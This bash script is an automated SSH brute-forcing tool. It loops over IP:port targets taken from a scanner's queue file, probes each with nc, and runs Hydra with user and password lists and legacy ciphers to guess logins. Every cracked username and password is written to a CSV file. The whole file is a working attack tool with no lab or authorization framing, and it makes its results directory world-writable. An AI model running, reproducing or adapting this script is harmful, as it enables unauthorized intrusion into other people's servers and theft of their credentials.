#!/bin/bash

# Paths
# Auto-detect the Backend directory from this script's location
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BASE_DIR="${SCANNER_BASE:-$(dirname "$SCRIPT_DIR")}"
LOGS_DIR="$BASE_DIR/logs/scanner"
SSH_FILE="$LOGS_DIR/classified/ssh.txt"
CRACKED_FILE="$LOGS_DIR/cracked/cracked.csv"
USER_LIST="$BASE_DIR/config/users.conf"
PASS_LIST="$BASE_DIR/config/pass.conf"
PROCESSED_IPS="$LOGS_DIR/processed_ips.txt"
CRACKED_DIR="$LOGS_DIR/cracked"

# Ensure the cracked directory exists and is writable
mkdir -p "$CRACKED_DIR"
if [ "$(id -u)" -eq 0 ]; then
    chmod 777 "$CRACKED_DIR"
fi

# Ensure the cracked.csv file exists with headers
if [ ! -f "$CRACKED_FILE" ]; then
    echo "ip,port,username,password,timestamp" > "$CRACKED_FILE"
fi

# Create processed IPs tracking file if it doesn't exist
touch "$PROCESSED_IPS"

# Function to check if an IP:port is already in cracked.csv
check_cracked() {
    local ip_port="$1"
    local ip=$(echo "$ip_port" | cut -d':' -f1)
    local port=$(echo "$ip_port" | cut -d':' -f2)
    grep -q "^$ip,$port," "$CRACKED_FILE"
    return $?
}

# Function to check if an IP:port was processed in this session
check_processed() {
    local ip_port="$1"
    grep -q "^$ip_port$" "$PROCESSED_IPS"
    return $?
}

# Function to mark an IP:port as processed
mark_processed() {
    local ip_port="$1"
    echo "$ip_port" >> "$PROCESSED_IPS"
}

# Function to clean stale IPs based on timestamp
clean_stale_ips() {
    local current_time=$(date -u +%s)
    local temp_file="$SSH_FILE.tmp"
    local changed=0

    if [ -s "$SSH_FILE" ]; then
        : > "$temp_file"
        while IFS= read -r line || [ -n "$line" ]; do
            [ -z "$line" ] && continue
            timestamp=$(echo "$line" | cut -d':' -f3-)
            timestamp_secs=$(date -d "${timestamp%Z}" +%s 2>/dev/null || echo 0)
            # Keep IPs with timestamps within the last 10 minutes (600 seconds)
            if [ $((current_time - timestamp_secs)) -le 600 ]; then
                echo "$line" >> "$temp_file"
            else
                changed=1
            fi
        done < "$SSH_FILE"
        if [ $changed -eq 1 ]; then
            mv "$temp_file" "$SSH_FILE"
            echo "[DEBUG] Cleaned stale IPs from $SSH_FILE"
        else
            rm -f "$temp_file"
        fi
    fi
}

# Function to crack SSH credentials for a given IP:port using Hydra with live output
crack_ssh() {
    local ip_port="$1"
    # Extract IP and port, ignoring the timestamp
    local ip=$(echo "$ip_port" | cut -d':' -f1)
    local port=$(echo "$ip_port" | cut -d':' -f2)

    # Create a clean ip:port string for checking and logging
    local clean_ip_port="$ip:$port"

    # Skip if already cracked
    if check_cracked "$clean_ip_port"; then
        echo "[-] $clean_ip_port already cracked, skipping..."
        return 0
    fi

    # Skip if already processed in this session
    if check_processed "$clean_ip_port"; then
        echo "[-] $clean_ip_port already processed in this session, skipping..."
        return 0
    fi

    echo "[+] Attempting to crack $clean_ip_port with Hydra..."

    # Debug: Check if Hydra binary exists
    if ! command -v hydra >/dev/null 2>&1; then
        echo "[-] Error: Hydra not found. Please ensure Hydra is installed."
        return 1
    fi
    echo "[DEBUG] Hydra binary found."

    # Debug: Check if user and password lists exist
    if [ ! -f "$USER_LIST" ]; then
        echo "[-] Error: User list $USER_LIST not found."
        return 1
    fi
    if [ ! -f "$PASS_LIST" ]; then
        echo "[-] Error: Password list $PASS_LIST not found."
        return 1
    fi
    echo "[DEBUG] User list: $USER_LIST, Password list: $PASS_LIST found."

    # Debug: Test SSH connectivity with longer timeout, retry for localhost
    echo "[DEBUG] Testing SSH connectivity to $ip:$port..."
    if [ "$ip" = "127.0.0.1" ]; then
        for i in 1 2; do
            if nc -z -w 10 "$ip" "$port" 2>/dev/null; then
                echo "[DEBUG] SSH port $port is open on $ip."
                break
            elif [ $i -eq 1 ]; then
                echo "[-] Retrying 127.0.0.1:22 connection..."
                sleep 2
            else
                echo "[-] Error: Cannot connect to $ip:$port. Is the SSH server running?"
                return 1
            fi
        done
    else
        if ! nc -z -w 10 "$ip" "$port" 2>/dev/null; then
            echo "[-] Error: Cannot connect to $ip:$port. Is the SSH server running?"
            return 1
        fi
        echo "[DEBUG] SSH port $port is open on $ip."
    fi

    # Run Hydra with live output, 1 thread, stop on first success, longer timeout, and enhanced ciphers/kex
    echo "[DEBUG] Running Hydra command: hydra -L $USER_LIST -P $PASS_LIST -s $port $ip ssh -t 1 -f -e ns -V -w 30 -I -m ssh-rsa -m ssh-dss -m 3des-cbc -m aes256-cbc -m diffie-hellman-group1-sha1 -m diffie-hellman-group14-sha1 -e s"
    [ -f hydra.restore ] && rm -f hydra.restore
    local success=1
    # Capture Hydra output and check for success based on credential detection only
    hydra -L "$USER_LIST" -P "$PASS_LIST" -s "$port" "$ip" ssh -t 1 -f -e ns -V -w 30 -I -m ssh-rsa -m ssh-dss -m 3des-cbc -m aes256-cbc -m diffie-hellman-group1-sha1 -m diffie-hellman-group14-sha1 -e s | \
    while IFS= read -r line; do
        # Print the line to the terminal live
        echo "$line"
        # Check if Hydra found a valid credential
        if echo "$line" | grep -q "\[.*ssh\] host: $ip.*login: .* password: .*"; then
            # Parse the username and password from the line
            local username=$(echo "$line" | grep -oP 'login: \K[^ ]+')
            local password=$(echo "$line" | grep -oP 'password: \K[^ ]+')
            if [ -n "$username" ] && [ -n "$password" ]; then
                local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
                echo "[+] Success: $clean_ip_port - Username: $username, Password: $password"
                echo "$ip,$port,$username,$password,$timestamp" >> "$CRACKED_FILE"
                success=0
            fi
        fi
    done

    if [ $success -eq 0 ]; then
        echo "[DEBUG] Hydra scan completed for $clean_ip_port with success"
        return 0
    else
        echo "[DEBUG] Hydra scan completed for $clean_ip_port with no success"
        return 1
    fi
}

# Main loop to process IPs from ssh.txt line by line
if [ ! -f "$SSH_FILE" ]; then
    echo "[-] $SSH_FILE not found, waiting..."
    exit 1
fi

# Ensure the logs directory exists
mkdir -p "$LOGS_DIR/classified"

# Trap Ctrl+C to clean up
trap 'echo "Interrupted by user, preserving $SSH_FILE and exiting..."; rm -f "$PROCESSED_IPS"; exit 1' INT

# Clean processed IPs file at start to avoid stale entries
: > "$PROCESSED_IPS"

# Process IPs continuously
while true; do
    # Clean stale IPs based on timestamp once per loop
    clean_stale_ips

    # Check if file exists and has content
    if [ ! -f "$SSH_FILE" ] || [ ! -s "$SSH_FILE" ]; then
        echo "[-] $SSH_FILE not found or empty, waiting..."
        sleep 5
        continue
    fi

    # Process file line by line
    while IFS= read -r ip_port || [ -n "$ip_port" ]; do
        # Skip empty lines
        [ -z "$ip_port" ] && continue

        # Extract clean ip:port
        clean_ip_port=$(echo "$ip_port" | cut -d':' -f1,2)

        # Skip if already processed in this session
        if check_processed "$clean_ip_port"; then
            echo "[-] $clean_ip_port already processed in this session, skipping..."
            sed -i "/^$clean_ip_port:/d" "$SSH_FILE"
            continue
        fi

        # Skip if already cracked
        if check_cracked "$clean_ip_port"; then
            echo "[-] $clean_ip_port already cracked, skipping..."
            # Remove the line from ssh.txt
            sed -i "/^$clean_ip_port:/d" "$SSH_FILE"
            continue
        fi

        # Attempt to crack with a delay
        sleep 2
        if crack_ssh "$ip_port"; then
            echo "[+] $ip_port successfully cracked, removing from queue"
            # Remove the line from ssh.txt
            sed -i "/^$clean_ip_port:/d" "$SSH_FILE"
            # Mark as processed
            mark_processed "$clean_ip_port"
        else
            echo "[-] $ip_port failed, moving to next target"
            # Mark as processed even if failed to avoid reprocessing
            mark_processed "$clean_ip_port"
        fi

        # Check file size again to handle truncation
        if [ ! -s "$SSH_FILE" ]; then
            echo "[DEBUG] $SSH_FILE is now empty or truncated, waiting for new entries..."
            break
        fi
    done < "$SSH_FILE"

    # If we broke out due to empty file, wait before next check
    if [ ! -s "$SSH_FILE" ]; then
        echo "[-] No more IPs to process, waiting for new entries..."
        sleep 5
    fi

    # Check if cracked.csv exceeds 500 lines (excluding header)
    line_count=$(wc -l < "$CRACKED_FILE" 2>/dev/null || echo 0)
    if [ "$line_count" -gt 500 ]; then
        echo "ip,port,username,password,timestamp" > "$CRACKED_FILE"
    fi
done